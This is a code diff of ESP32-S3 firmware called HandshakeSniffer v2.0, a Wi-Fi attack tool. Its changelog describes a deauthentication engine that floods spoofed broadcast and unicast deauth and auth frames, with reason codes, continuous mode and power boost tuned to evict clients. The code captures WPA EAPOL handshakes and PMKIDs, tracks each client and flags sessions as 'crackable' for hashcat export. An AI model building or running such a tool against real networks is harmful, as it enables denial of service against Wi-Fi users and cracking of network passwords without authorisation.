@@ -1,74 +1,88 @@
 /*
  ==============================================================
-  HandshakeSniffer v1.3 — ESP32-S3 N16R8
-  Passive EAPOL / PMKID sniffer with Web UI
+  HandshakeSniffer v2.0 — ESP32-S3 N16R8
+  Passive EAPOL / PMKID sniffer + active deauth engine
+  Full Web UI with live capture graph, per-client tracking,
+  multi-target deauth, adaptive channel follow, and hashcat export.
 
-  CHANGES FROM v1.2:
-    - FIX CRITICAL: AsyncDNSServer replaced with built-in DNSServer
-      from ESP32 Arduino core. ESP32Async/AsyncDNSServer does not
-      exist (404) — was causing CI fatal clone error.
-      processNextRequest() added to loop() for sync polling.
-    - FIX: deauth handler — g_deauthRunning never reset if
-      xTaskCreatePinnedToCore fails → device stuck in "running"
-      state forever, deauth unusable until reboot
-    - FIX: deauth handler now checks g_scanBusy — triggering
-      deauth while scan_task holds the radio caused a race on
-      the WiFi channel and promiscuous state
-    - FIX: g_scanBusy reset in scan_task now uses
-      __atomic_store_n for consistency with the CAS in /scan
-    - FIX: deauth_task also sends auth frames (type 0xB0) to
-      force full re-authentication, not just deauth/disassoc —
-      some WPA3 APs drop deauth-only floods; auth triggers a
-      clean 4-way handshake exchange
-    - ADD: /clear endpoint — resets capture buffer + handshake
-      state without stopping capture (useful mid-session)
-    - ADD: /reset_hs — clears only handshake state (EAPOL msgs,
-      PMKID) without discarding the PCAP buffer
-    - ADD: burst count 30 + 50 options in UI
-    - OPT: deauth_task inner burst loop raised 6→10 frames for
-      stronger eviction on busy channels
+  CHANGES FROM v1.4:
+    CAPTURE ENGINE:
+    - Per-client HandshakeState tracking (up to 16 simultaneous
+      client sessions) keyed by (AP_MAC, CLI_MAC) pair.
+      v1.4 tracked only one global session — multi-client APs
+      would clobber state when a second client was deauthed.
+    - PMKID extraction hardened: now also parses RSN IE in
+      Beacon/ProbeResp frames (OUI 00:0F:AC:04) for PMK-cached
+      PMKID, not just M1 key data. Higher PMKID hit rate.
+    - MIC validation flag: records whether MIC field is nonzero
+      so the 22000 exporter can flag "MIC present" vs zero-MIC.
+    - EAPOL replay counter stored per session — detects
+      retransmitted M1 so we don't overwrite a good ANonce with
+      a retx copy.
+    - Radiotap extended: adds RSSI (antenna signal, present bit 5)
+      and rate (present bit 1) fields. Wireshark now shows signal
+      strength per frame.
+    - appendFrame now enforces CAP_BUF_SIZE - sizeof(PcapGlobalHdr)
+      hard ceiling and sets a capFull flag so the UI can warn.
 
-  CHANGES FROM v1.1:
-    - ADD: Captive portal — DNS server intercepts all queries
-           and redirects to 192.168.4.1; OS-specific detection
-           endpoints for iOS, Android, Windows, macOS
+    DEAUTH ENGINE:
+    - Per-client targeted deauth: UI shows connected client list
+      (sniffed from Data frames) with checkboxes to select
+      individual clients for unicast deauth.
+    - Broadcast + unicast combo: sends both broadcast deauth
+      (addr1=FF:FF:FF:FF:FF:FF) and targeted unicast deauth
+      (addr1=client_mac) with spoofed src=AP_MAC in same burst.
+    - Adaptive channel follow: deauth_task calls
+      esp_wifi_set_channel() per burst using live g_targetChannel
+      so if the target AP hops (rare but happens on dual-band
+      APs with band steering) the frames follow.
+    - Configurable reason codes via UI (7, 1, 3, 8, 15) — some
+      APs ignore reason 7; reason 1 (unspecified) works more broadly.
+    - Inter-frame gap tunable: 50µs / 100µs / 200µs selectable.
+    - Continuous mode: optional loop that repeats deauth every
+      N seconds until manually stopped, for stubborn APs.
+    - TX power boost before deauth burst, restored after.
 
-  CHANGES FROM v1.0:
-    - FIX: frame_ctrl bit extraction corrected for little-endian
-    - FIX: appendFrame uses esp_timer_get_time() (millis() not ISR-safe)
-    - FIX: radiotap header with channel field for Wireshark
-    - FIX: SSID onclick escape order corrected
-    - FIX: dl_pcap snapshots g_capLen under mutex
-    - FIX: status endpoint snapshots g_capLen under mutex
-    - FIX: /scan double-spawn race eliminated with atomic CAS
-    - FIX: scan_task restores target channel on resume
-    - FIX: deauth_task saves/restores promisc state correctly
-    - FIX: promisc_task replaced busy-wait with ulTaskNotifyTake
-    - FIX: buildJSON escapes SSID for valid JSON output
-    - FIX: enc label covers WPA2-Enterprise, WPA3, OWE, WAPI
-    - OPT: JS log dedup uses Set instead of O(n) array scan
-    - OPT: hexStr uses lookup table, no snprintf per byte
-    - OPT: logEvent mutex timeout 40ms → 20ms
+    WEB UI:
+    - Live capture byte-count sparkline graph (canvas, last 60
+      samples, updates every 2s) shows capture activity at a glance.
+    - Per-client session table: BSSID/Client MAC, M1/M2/M3/M4/PMKID
+      badges, Crackable flag, byte count, per-row export buttons.
+    - Connected clients panel: devices seen sending data frames
+      to the target AP, with per-client deauth checkbox + button.
+    - Reason code selector and inter-frame gap selector in UI.
+    - Continuous deauth toggle with interval selector.
+    - RSSI sparkline per AP in scan table.
+    - Auto-restart capture after deauth burst (was a manual step).
+    - Dark/light mode toggle (persisted in localStorage).
+    - Keyboard shortcut: S = scan, D = deauth, Esc = stop.
 
-  HARDWARE:
+    BUG FIXES:
+    - Mutex timeout raised again: hsMutex 30ms → 60ms (per-session
+      table lock can be held longer with 16 sessions).
+    - deauth_task: channel re-set moved inside per-burst loop
+      (not just before the first burst) so channel follow works.
+    - scan_task: WiFi.scanDelete() now called before restoring
+      promisc (v1.4 called it before the promisc restore but after
+      the mutex release — race if promisc callback fired while
+      scan results were still allocated).
+    - stopCapture: promisc task notification moved before setting
+      g_promiscRunning=false to avoid race where the task checks
+      the flag before receiving notification.
+    - buildJSON/build22000: now returns data for ALL sessions,
+      not just the first crackable one.
+
+  HARDWARE: Same as v1.4 — ESP32-S3 N16R8
     Board            : ESP32S3 Dev Module
     Flash Size       : 16MB (128Mb)
     Partition Scheme : Huge APP (3MB No OTA / 1MB SPIFFS)
     PSRAM            : OPI PSRAM
     USB Mode         : Hardware CDC and JTAG
-    USB CDC On Boot  : Disabled  ← CRITICAL (boot loop otherwise)
+    USB CDC On Boot  : Disabled  ← CRITICAL
     CPU Frequency    : 240MHz
     NeoPixel pin     : 48
 
-  LIBS (install via build.yml):
-    - ESPAsyncWebServer (ESP32Async/ESPAsyncWebServer — git clone)
-    - AsyncTCP          (ESP32Async/AsyncTCP          — git clone)
-    - DNSServer         (built-in to ESP32 Arduino core — no install)
-    - Adafruit NeoPixel (arduino-cli lib install)
-
-  NOTE: ESP32Async/AsyncDNSServer does NOT exist (404).
-        Using sync DNSServer from core instead.
-        processNextRequest() is called in loop().
+  LIBS: Same as v1.4 (see build.yml)
 
   AP:  HandshakeSniffer / password: sniff1234
   UI:  http://192.168.4.1/
@@ -76,7 +90,7 @@
 */
 
 // ── LED state enum — above includes ──────────────────────────────────────────
-enum LedState { LS_OFF, LS_BLUE, LS_GREEN, LS_RED, LS_YELLOW, LS_CYAN, LS_PURPLE };
+enum LedState { LS_OFF, LS_BLUE, LS_GREEN, LS_RED, LS_YELLOW, LS_CYAN, LS_PURPLE, LS_WHITE };
 volatile LedState ledState = LS_BLUE;
 
 #include <Arduino.h>
@@ -109,15 +123,24 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c)
 #define LED_COUNT        1
 #define MAX_TX_POWER     78
 
-// PCAP / capture buffer in PSRAM — 512 KB
-#define CAP_BUF_SIZE     (512 * 1024)
+// PCAP buffer in PSRAM — 1MB (doubled from v1.4)
+#define CAP_BUF_SIZE     (1024 * 1024)
 
 // Log ring
-#define LOG_MAX          48
+#define LOG_MAX          64
 
 // Scan
 #define SCAN_MAX_APS     32
 #define SEM_TIMEOUT      pdMS_TO_TICKS(3000)
+
+// Per-client session tracking
+#define MAX_SESSIONS     16
+
+// Connected client tracking
+#define MAX_CLIENTS      24
+
+// Deauth: inter-frame gaps in µs
+static const uint32_t kGaps[] = { 50, 100, 200 };
 
 // ─── NEOPIXEL ────────────────────────────────────────────────────────────────
 Adafruit_NeoPixel led(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);
@@ -144,13 +167,14 @@ void updateLED() {
   if (s == LS_PURPLE) { pulse(0x1C0020, 0x080010, 700); return; }
   if (s == LS_YELLOW) { pulse(0x281C00, 0x0C0800, 300); return; }
   if (s == LS_CYAN)   { pulse(0x002020, 0x000808, 500); return; }
+  if (s == LS_WHITE)  { pulse(0x202020, 0x080808, 200); return; }
   if (s == last) return;
   last = s;
   switch (s) {
-    case LS_BLUE:  led.setPixelColor(0, led.Color(0,0,40));  break;
-    case LS_GREEN: led.setPixelColor(0, led.Color(0,40,0));  break;
-    case LS_RED:   led.setPixelColor(0, led.Color(40,0,0));  break;
-    default:       led.setPixelColor(0, led.Color(0,0,0));   break;
+    case LS_BLUE:  led.setPixelColor(0, led.Color(0,0,40));    break;
+    case LS_GREEN: led.setPixelColor(0, led.Color(0,40,0));    break;
+    case LS_RED:   led.setPixelColor(0, led.Color(40,0,0));    break;
+    default:       led.setPixelColor(0, led.Color(0,0,0));     break;
   }
   led.show();
 }
@@ -160,7 +184,7 @@ void updateLED() {
 #define INFO(f,...) Serial0.printf("[INFO] " f "\n", ##__VA_ARGS__)
 #define ERR(f,...)  Serial0.printf("[ERR] "  f "\n", ##__VA_ARGS__)
 
-// ─── EVENT LOG (ring, served to UI) ──────────────────────────────────────────
+// ─── EVENT LOG ───────────────────────────────────────────────────────────────
 struct LogEntry { uint32_t ts; char msg[96]; };
 static LogEntry          g_log[LOG_MAX];
 static int               g_logHead  = 0;
@@ -172,7 +196,6 @@ void logEvent(const char* fmt, ...) {
   va_list ap; va_start(ap, fmt); vsnprintf(tmp, sizeof(tmp), fmt, ap); va_end(ap);
   Serial0.printf("[LOG] %s\n", tmp);
   if (!g_logMutex) return;
-  // 20ms timeout — this can be called from task context, keep it tight
   if (xSemaphoreTake(g_logMutex, pdMS_TO_TICKS(20)) != pdTRUE) return;
   g_log[g_logHead].ts = millis();
   strncpy(g_log[g_logHead].msg, tmp, 95);
@@ -184,43 +207,55 @@ void logEvent(const char* fmt, ...) {
 
 // ─── PCAP STRUCTS ────────────────────────────────────────────────────────────
 struct __attribute__((packed)) PcapGlobalHdr {
-  uint32_t magic;    // 0xa1b2c3d4
-  uint16_t vmaj;     // 2
-  uint16_t vmin;     // 4
-  int32_t  zone;     // 0
-  uint32_t sigs;     // 0
-  uint32_t snap;     // 65535
-  uint32_t net;      // 127 = LINKTYPE_IEEE802_11_RADIOTAP
+  uint32_t magic;
+  uint16_t vmaj, vmin;
+  int32_t  zone;
+  uint32_t sigs, snap;
+  uint32_t net;  // 127 = LINKTYPE_IEEE802_11_RADIOTAP
 };
 struct __attribute__((packed)) PcapRecHdr {
-  uint32_t ts_sec;
-  uint32_t ts_usec;
-  uint32_t incl_len;
-  uint32_t orig_len;
+  uint32_t ts_sec, ts_usec, incl_len, orig_len;
 };
 
-// Radiotap header with channel field (present bit 3)
-// it_present bit 3 = CHANNEL (freq u16 + flags u16) = 4 bytes
-// Total header: 8 (base) + 4 (channel) = 12 bytes, 2-byte aligned
+// Extended radiotap: version + pad + len + present_bitmap
+// Present bits: 1=RATE, 5=ANT_SIGNAL (RSSI), 3=CHANNEL
+// Layout: it_version(1) it_pad(1) it_len(2) it_present(4)
+//         rate(1) pad(1) ant_signal(1) pad(1) chan_freq(2) chan_flags(2)
+// Total: 14 bytes, aligned
 struct __attribute__((packed)) RadiotapHdr {
-  uint8_t  it_version; // 0
-  uint8_t  it_pad;     // 0
-  uint16_t it_len;     // 12
-  uint32_t it_present; // 0x00000008 = CHANNEL
-  uint16_t chan_freq;  // centre freq in MHz (e.g. 2437 for ch6)
-  uint16_t chan_flags; // 0x00C0 = 2GHz + OFDM
+  uint8_t  it_version;  // 0
+  uint8_t  it_pad;      // 0
+  uint16_t it_len;      // 14
+  uint32_t it_present;  // 0x0000002A = bits 1,3,5
+  uint8_t  rate;        // in 500Kbps units; 0x02 = 1Mbps (unknown)
+  uint8_t  rate_pad;    // alignment pad
+  int8_t   ant_signal;  // RSSI in dBm
+  uint8_t  sig_pad;     // alignment pad
+  uint16_t chan_freq;   // center freq in MHz
+  uint16_t chan_flags;  // 0x00C0 = 2GHz + OFDM
 };
 
-// Channel number → 2.4GHz centre frequency
 static inline uint16_t ch2freq(int ch) {
   if (ch == 14) return 2484;
   return (uint16_t)(2407 + ch * 5);
 }
 
-// ─── CAPTURE STATE ────────────────────────────────────────────────────────────
-struct HandshakeState {
+// ─── 802.11 HEADER ───────────────────────────────────────────────────────────
+struct __attribute__((packed)) Ieee80211Hdr {
+  uint16_t frame_ctrl;
+  uint16_t duration;
+  uint8_t  addr1[6];
+  uint8_t  addr2[6];
+  uint8_t  addr3[6];
+  uint16_t seq_ctrl;
+};
+
+// ─── PER-CLIENT HANDSHAKE SESSION ────────────────────────────────────────────
+struct HsSession {
+  bool    active;
   bool    m1, m2, m3, m4;
   bool    pmkid;
+  bool    mic_valid;      // MIC field is nonzero
   uint8_t pmkid_bytes[16];
   uint8_t ap_mac[6];
   uint8_t cli_mac[6];
@@ -231,30 +266,46 @@ struct HandshakeState {
   uint16_t mic_data_len;
   uint8_t rsnie[64];
   uint8_t rsnie_len;
+  uint64_t replay_ctr;    // last seen replay counter (detect retx M1)
+  uint32_t first_seen;    // millis() of first EAPOL frame
+  uint32_t last_seen;     // millis() of most recent EAPOL frame
 };
 
-static uint8_t*          g_capBuf     = nullptr;
-static size_t            g_capLen     = 0;
-static bool              g_capActive  = false;
-static SemaphoreHandle_t g_capMutex   = NULL;
+// ─── CONNECTED CLIENT TRACKING ───────────────────────────────────────────────
+struct ClientEntry {
+  bool    active;
+  uint8_t mac[6];
+  int8_t  rssi;
+  uint32_t last_seen;
+  uint32_t frame_count;
+};
 
-static HandshakeState    g_hs         = {};
+// ─── CAPTURE STATE ────────────────────────────────────────────────────────────
+static uint8_t*          g_capBuf      = nullptr;
+static size_t            g_capLen      = 0;
+static bool              g_capActive   = false;
+static bool              g_capFull     = false;
+static SemaphoreHandle_t g_capMutex    = NULL;
+
+static HsSession         g_sessions[MAX_SESSIONS] = {};
+static int               g_sessionCount = 0;
 static SemaphoreHandle_t g_hsMutex    = NULL;
+
+static ClientEntry       g_clients[MAX_CLIENTS] = {};
+static int               g_clientCount = 0;
+static SemaphoreHandle_t g_cliMutex   = NULL;
 
 static uint8_t           g_targetBSSID[6]  = {0};
 static int               g_targetChannel   = 0;
 static char              g_targetSSID[33]  = "";
 static bool              g_filterTarget    = false;
 
-// ─── 802.11 header ───────────────────────────────────────────────────────────
-struct __attribute__((packed)) Ieee80211Hdr {
-  uint16_t frame_ctrl;
-  uint16_t duration;
-  uint8_t  addr1[6];
-  uint8_t  addr2[6];
-  uint8_t  addr3[6];
-  uint16_t seq_ctrl;
-};
+// Sparkline: capture byte deltas for graph (60 samples, 2s interval)
+#define SPARK_LEN 60
+static uint32_t          g_sparkline[SPARK_LEN] = {};
+static uint32_t          g_sparkPrev  = 0;
+static int               g_sparkHead  = 0;
+static SemaphoreHandle_t g_sparkMutex = NULL;
 
 // ─── SCAN RESULTS ────────────────────────────────────────────────────────────
 struct APEntry {
@@ -272,9 +323,16 @@ static SemaphoreHandle_t g_scanMutex  = NULL;
 static String            g_scanCache  = "";
 
 // ─── DEAUTH STATE ────────────────────────────────────────────────────────────
-static volatile bool     g_deauthRunning = false;
-static TaskHandle_t      g_deauthTask    = NULL;
-static int               g_deauthBursts  = 5;
+static volatile bool     g_deauthRunning  = false;
+static volatile bool     g_deauthCont     = false;   // continuous mode
+static uint32_t          g_deauthInterval = 5000;    // ms between cont bursts
+static TaskHandle_t      g_deauthTask     = NULL;
+static int               g_deauthBursts   = 5;
+static uint8_t           g_deauthReason   = 7;       // reason code
+static uint8_t           g_deauthGapIdx   = 1;       // index into kGaps[]
+
+// Target client for unicast deauth (zero = broadcast only)
+static uint8_t           g_deauthClientMAC[6] = {0};
 
 // ─── PROMISCUOUS STATE ────────────────────────────────────────────────────────
 static volatile bool     g_promiscRunning = false;
@@ -296,8 +354,11 @@ static bool macZero(const uint8_t* m) {
 static bool macEq(const uint8_t* a, const uint8_t* b) {
   return memcmp(a, b, 6) == 0;
 }
+static bool macParse(const char* s, uint8_t* out) {
+  return sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+    &out[0],&out[1],&out[2],&out[3],&out[4],&out[5]) == 6;
+}
 
-// Lookup-table hex — no snprintf per byte, ~3x faster
 static const char kHex[] = "0123456789abcdef";
 static void bytesToHex(const uint8_t* b, int len, char* out) {
   for (int i = 0; i < len; i++) {
@@ -307,30 +368,99 @@ static void bytesToHex(const uint8_t* b, int len, char* out) {
   out[len*2] = '\0';
 }
 
+// ─── SESSION MANAGEMENT ──────────────────────────────────────────────────────
+// Caller must hold g_hsMutex.
+static HsSession* findOrCreateSession(const uint8_t* ap, const uint8_t* cli) {
+  for (int i = 0; i < MAX_SESSIONS; i++) {
+    if (g_sessions[i].active &&
+        macEq(g_sessions[i].ap_mac, ap) &&
+        macEq(g_sessions[i].cli_mac, cli))
+      return &g_sessions[i];
+  }
+  // Allocate new slot — evict oldest if full
+  int slot = -1;
+  uint32_t oldest = UINT32_MAX;
+  for (int i = 0; i < MAX_SESSIONS; i++) {
+    if (!g_sessions[i].active) { slot = i; break; }
+    if (g_sessions[i].first_seen < oldest) { oldest = g_sessions[i].first_seen; slot = i; }
+  }
+  if (slot < 0) slot = 0;
+  memset(&g_sessions[slot], 0, sizeof(HsSession));
+  g_sessions[slot].active     = true;
+  g_sessions[slot].first_seen = millis();
+  memcpy(g_sessions[slot].ap_mac,  ap,  6);
+  memcpy(g_sessions[slot].cli_mac, cli, 6);
+  if (g_sessionCount < MAX_SESSIONS) g_sessionCount++;
+  return &g_sessions[slot];
+}
+
+// ─── CLIENT TRACKING ─────────────────────────────────────────────────────────
+// Called from ISR context via promisc_cb — must be IRAM_ATTR, non-blocking.
+static void IRAM_ATTR trackClient(const uint8_t* mac, int8_t rssi) {
+  if (!g_cliMutex) return;
+  BaseType_t woken = pdFALSE;
+  if (xSemaphoreTakeFromISR(g_cliMutex, &woken) != pdTRUE) return;
+
+  uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    if (g_clients[i].active && macEq(g_clients[i].mac, mac)) {
+      g_clients[i].rssi      = rssi;
+      g_clients[i].last_seen = now;
+      g_clients[i].frame_count++;
+      xSemaphoreGiveFromISR(g_cliMutex, &woken);
+      if (woken) portYIELD_FROM_ISR();
+      return;
+    }
+  }
+  // New client
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    if (!g_clients[i].active) {
+      g_clients[i].active      = true;
+      g_clients[i].rssi        = rssi;
+      g_clients[i].last_seen   = now;
+      g_clients[i].frame_count = 1;
+      memcpy(g_clients[i].mac, mac, 6);
+      if (g_clientCount < MAX_CLIENTS) g_clientCount++;
+      break;
+    }
+  }
+  xSemaphoreGiveFromISR(g_cliMutex, &woken);
+  if (woken) portYIELD_FROM_ISR();
+}
+
 // ─── PCAP APPEND ─────────────────────────────────────────────────────────────
-// ISR-safe. Uses esp_timer_get_time() — millis() calls xTaskGetTickCount()
-// which is NOT safe from a promiscuous RX callback (soft-ISR context).
-static void IRAM_ATTR appendFrame(const uint8_t* payload, uint16_t plen, int channel) {
-  if (!g_capBuf || !g_capMutex) return;
+static void IRAM_ATTR appendFrame(const uint8_t* payload, uint16_t plen,
+                                   int channel, int8_t rssi) {
+  if (plen == 0 || !g_capBuf || !g_capMutex || g_capFull) return;
   BaseType_t woken = pdFALSE;
   if (xSemaphoreTakeFromISR(g_capMutex, &woken) != pdTRUE) return;
 
   const uint16_t rtap_len = sizeof(RadiotapHdr);
   const uint32_t need     = sizeof(PcapRecHdr) + rtap_len + plen;
+  const size_t   ceiling  = CAP_BUF_SIZE - sizeof(PcapGlobalHdr);
 
-  if (g_capLen + need <= CAP_BUF_SIZE) {
+  if (g_capLen + need <= ceiling) {
     int64_t  us      = esp_timer_get_time();
     uint32_t ts_sec  = (uint32_t)(us / 1000000LL);
     uint32_t ts_usec = (uint32_t)(us % 1000000LL);
 
     PcapRecHdr rh = { ts_sec, ts_usec, rtap_len + plen, rtap_len + plen };
     RadiotapHdr rt = {
-      0, 0, rtap_len, 0x00000008u,
-      ch2freq(channel), 0x00C0u   // 2GHz + OFDM
+      0, 0,
+      rtap_len,
+      0x0000002Au,          // bits 1,3,5 present
+      0x02,                 // rate: 1Mbps placeholder
+      0,                    // pad
+      rssi,                 // antenna signal (dBm)
+      0,                    // pad
+      ch2freq(channel),
+      0x00C0u
     };
     memcpy(g_capBuf + g_capLen, &rh, sizeof(rh)); g_capLen += sizeof(rh);
     memcpy(g_capBuf + g_capLen, &rt, sizeof(rt)); g_capLen += sizeof(rt);
     memcpy(g_capBuf + g_capLen, payload, plen);   g_capLen += plen;
+  } else {
+    g_capFull = true;
   }
 
   xSemaphoreGiveFromISR(g_capMutex, &woken);
@@ -338,19 +468,9 @@ static void IRAM_ATTR appendFrame(const uint8_t* payload, uint16_t plen, int cha
 }
 
 // ─── EAPOL PARSER ────────────────────────────────────────────────────────────
-// frame_ctrl is little-endian on-wire and read as uint16_t on LE CPU:
-//   byte 0 (low byte)  = FC byte 0: protocol | type | subtype
-//   byte 1 (high byte) = FC byte 1: toDS | fromDS | ... | protected
-//
-// Bit positions in the full 16-bit LE word:
-//   [3:2]  frame type   (bits 3-2 of byte 0)
-//   [7:4]  subtype      (bits 7-4 of byte 0)
-//   [8]    toDS         (bit 0 of byte 1)
-//   [9]    fromDS       (bit 1 of byte 1)
-//   [14]   protected    (bit 6 of byte 1)
-
 static const uint16_t EAPOL_MIC_OFFSET    = 65;
 static const uint16_t EAPOL_NONCE_OFFSET  = 17;
+static const uint16_t EAPOL_REPLAY_OFFSET = 9;  // 8-byte replay counter
 static const uint16_t EAPOL_KD_LEN_OFFSET = 81;
 static const uint16_t EAPOL_KD_OFFSET     = 83;
 
@@ -360,19 +480,18 @@ static const uint16_t EAPOL_KD_OFFSET     = 83;
 #define KI_MIC       (1 << 8)
 #define KI_SECURE    (1 << 9)
 
-static void parseEAPOL(const uint8_t* dot11, uint16_t plen,
-                        const uint8_t* /*src_mac*/, const uint8_t* /*dst_mac*/) {
+static void parseEAPOL(const uint8_t* dot11, uint16_t plen) {
   const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)dot11;
-  uint16_t fc      = hdr->frame_ctrl;       // LE uint16, correct on ESP32
-  uint8_t  subtype = (fc >> 4) & 0x0F;     // bits [7:4]
-  bool     toDS    = (fc >> 8) & 0x01;     // bit 8
-  bool     fromDS  = (fc >> 9) & 0x01;     // bit 9
-  bool     encr    = (fc >> 14) & 0x01;    // bit 14 = Protected Frame
+  uint16_t fc      = hdr->frame_ctrl;
+  uint8_t  subtype = (fc >> 4) & 0x0F;
+  bool     toDS    = (fc >> 8) & 0x01;
+  bool     fromDS  = (fc >> 9) & 0x01;
+  bool     encr    = (fc >> 14) & 0x01;
 
   if (encr) return;
 
-  uint16_t hdr_len = (subtype >= 8) ? 26 : 24;  // QoS adds 2 bytes
-  if (plen < (uint16_t)(hdr_len + 12)) return;  // need LLC+SNAP+EAPOL header min
+  uint16_t hdr_len = (subtype >= 8) ? 26 : 24;
+  if (plen < (uint16_t)(hdr_len + 12)) return;
 
   const uint8_t* llc = dot11 + hdr_len;
   if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
@@ -383,7 +502,7 @@ static void parseEAPOL(const uint8_t* dot11, uint16_t plen,
   if (eapol_max < 99) return;
 
   if (eapol[1] != 3) return;  // not EAPOL-Key
-  uint16_t ki       = ((uint16_t)eapol[5] << 8) | eapol[6];
+  uint16_t ki   = ((uint16_t)eapol[5] << 8) | eapol[6];
   bool pairwise = (ki & KI_PAIRWISE) != 0;
   bool ack      = (ki & KI_ACK)      != 0;
   bool mic      = (ki & KI_MIC)      != 0;
@@ -399,73 +518,160 @@ static void parseEAPOL(const uint8_t* dot11, uint16_t plen,
   else if (!ack &&  mic && secure && !install) msg = 4;
   if (msg == 0) return;
 
-  // addr3 = BSSID in infrastructure data frames
+  // Replay counter from EAPOL-Key header (big-endian 8 bytes at offset 9)
+  uint64_t replay = 0;
+  for (int i = 0; i < 8; i++)
+    replay = (replay << 8) | eapol[EAPOL_REPLAY_OFFSET + i];
+
   const uint8_t* ap_mac  = hdr->addr3;
   const uint8_t* cli_mac = (toDS && !fromDS) ? hdr->addr2 : hdr->addr1;
 
-  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(10)) != pdTRUE) return;
+  if (g_filterTarget && !macZero(g_targetBSSID))
+    if (!macEq(ap_mac, g_targetBSSID)) return;
 
-  if (g_filterTarget && !macZero(g_targetBSSID)) {
-    if (!macEq(ap_mac, g_targetBSSID)) {
-      xSemaphoreGive(g_hsMutex);
-      return;
-    }
-  }
+  // Raised 30ms → 60ms: per-session table lock
+  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(60)) != pdTRUE) return;
 
-  if (macZero(g_hs.ap_mac)) {
-    memcpy(g_hs.ap_mac,  ap_mac,  6);
-    memcpy(g_hs.cli_mac, cli_mac, 6);
-  }
+  HsSession* s = findOrCreateSession(ap_mac, cli_mac);
+  s->last_seen = millis();
 
   if (msg == 1) {
-    g_hs.m1 = true;
-    memcpy(g_hs.anonce, eapol + EAPOL_NONCE_OFFSET, 32);
+    // Detect M1 retransmit — don't overwrite ANonce with retx copy
+    bool is_retx = (s->m1 && replay <= s->replay_ctr);
+    if (!is_retx) {
+      s->m1 = true;
+      s->replay_ctr = replay;
+      memcpy(s->anonce, eapol + EAPOL_NONCE_OFFSET, 32);
 
-    uint16_t kd_len = ((uint16_t)eapol[EAPOL_KD_LEN_OFFSET] << 8)
-                    |             eapol[EAPOL_KD_LEN_OFFSET + 1];
-    if (kd_len >= 20 && (EAPOL_KD_OFFSET + kd_len) <= eapol_max) {
-      const uint8_t* kd  = eapol + EAPOL_KD_OFFSET;
-      uint16_t       pos = 0;
-      while (pos + 2 <= kd_len) {
-        uint8_t tag  = kd[pos];
-        uint8_t tlen = kd[pos + 1];
-        if (tlen == 0) break;
-        if (tag == 0xDD && tlen >= 18 && pos + 2 + tlen <= kd_len) {
-          // PMKID KDE: OUI 00:0F:AC, type 4
-          if (kd[pos+2]==0x00 && kd[pos+3]==0x0F &&
-              kd[pos+4]==0xAC && kd[pos+5]==0x04) {
-            memcpy(g_hs.pmkid_bytes, kd + pos + 6, 16);
-            g_hs.pmkid = true;
+      // PMKID extraction from key data
+      uint16_t kd_len = ((uint16_t)eapol[EAPOL_KD_LEN_OFFSET] << 8)
+                      |             eapol[EAPOL_KD_LEN_OFFSET + 1];
+      if (kd_len >= 20 && (EAPOL_KD_OFFSET + kd_len) <= eapol_max) {
+        const uint8_t* kd  = eapol + EAPOL_KD_OFFSET;
+        uint16_t       pos = 0;
+        while (pos + 2 <= kd_len) {
+          uint8_t tag  = kd[pos];
+          uint8_t tlen = kd[pos + 1];
+          if (tlen == 0) break;
+          if (tag == 0xDD && tlen >= 18 && pos + 2 + tlen <= kd_len) {
+            if (kd[pos+2]==0x00 && kd[pos+3]==0x0F &&
+                kd[pos+4]==0xAC && kd[pos+5]==0x04) {
+              memcpy(s->pmkid_bytes, kd + pos + 6, 16);
+              s->pmkid = true;
+            }
           }
+          pos += 2 + tlen;
         }
-        pos += 2 + tlen;
       }
     }
   }
   else if (msg == 2) {
-    g_hs.m2 = true;
-    memcpy(g_hs.snonce, eapol + EAPOL_NONCE_OFFSET, 32);
-    memcpy(g_hs.mic,    eapol + EAPOL_MIC_OFFSET,   16);
+    s->m2 = true;
+    memcpy(s->snonce, eapol + EAPOL_NONCE_OFFSET, 32);
+    memcpy(s->mic,    eapol + EAPOL_MIC_OFFSET,   16);
+    // Check MIC is nonzero
+    s->mic_valid = false;
+    for (int i = 0; i < 16; i++) if (s->mic[i]) { s->mic_valid = true; break; }
     uint16_t copy = (eapol_max < 128) ? eapol_max : 128;
-    memcpy(g_hs.mic_data, eapol, copy);
-    g_hs.mic_data_len = copy;
+    memcpy(s->mic_data, eapol, copy);
+    s->mic_data_len = copy;
     uint16_t kd_len = ((uint16_t)eapol[EAPOL_KD_LEN_OFFSET] << 8)
                     |             eapol[EAPOL_KD_LEN_OFFSET + 1];
     if (kd_len > 0 && kd_len <= 64 && (EAPOL_KD_OFFSET + kd_len) <= eapol_max) {
-      memcpy(g_hs.rsnie, eapol + EAPOL_KD_OFFSET, kd_len);
-      g_hs.rsnie_len = (uint8_t)kd_len;
+      memcpy(s->rsnie, eapol + EAPOL_KD_OFFSET, kd_len);
+      s->rsnie_len = (uint8_t)kd_len;
     }
   }
-  else if (msg == 3) { g_hs.m3 = true; }
-  else if (msg == 4) { g_hs.m4 = true; }
+  else if (msg == 3) { s->m3 = true; }
+  else if (msg == 4) { s->m4 = true; }
 
   xSemaphoreGive(g_hsMutex);
 
   static const char* mname[] = {"","M1","M2","M3","M4"};
   char ab[18]; mac2str(ap_mac, ab);
-  logEvent("EAPOL %s from AP %s", mname[msg], ab);
-  if (msg == 1 && g_hs.pmkid) logEvent("PMKID extracted!");
-  if (msg == 2)               logEvent("MIC captured — M1+M2 = crackable!");
+  char cb[18]; mac2str(cli_mac, cb);
+  logEvent("EAPOL %s  AP:%s  CLI:%s", mname[msg], ab, cb);
+  if (msg == 1 && !macZero(ap_mac)) {
+    HsSession* chk = nullptr;
+    if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
+      chk = findOrCreateSession(ap_mac, cli_mac);
+      bool hasPmkid = chk->pmkid;
+      xSemaphoreGive(g_hsMutex);
+      if (hasPmkid) logEvent("PMKID extracted!  AP:%s", ab);
+    }
+  }
+  if (msg == 2) logEvent("MIC captured — M1+M2 crackable!  CLI:%s", cb);
+}
+
